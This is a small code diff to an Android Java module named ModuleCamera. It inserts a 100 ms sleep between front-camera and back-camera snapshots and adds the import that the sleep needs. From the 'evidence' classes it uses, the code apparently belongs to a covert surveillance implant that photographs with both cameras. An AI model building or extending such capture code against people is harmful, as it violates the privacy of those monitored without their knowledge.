@@ -20,6 +20,7 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.module.camera.CameraSnapshot;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Utils;
 
 import java.io.IOException;
 
@@ -94,6 +95,7 @@ public class ModuleCamera extends BaseInstantModule {
 			CameraSnapshot camera = CameraSnapshot.self();
 
 			camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
+			Utils.sleep(100);
 			camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
 
 		}
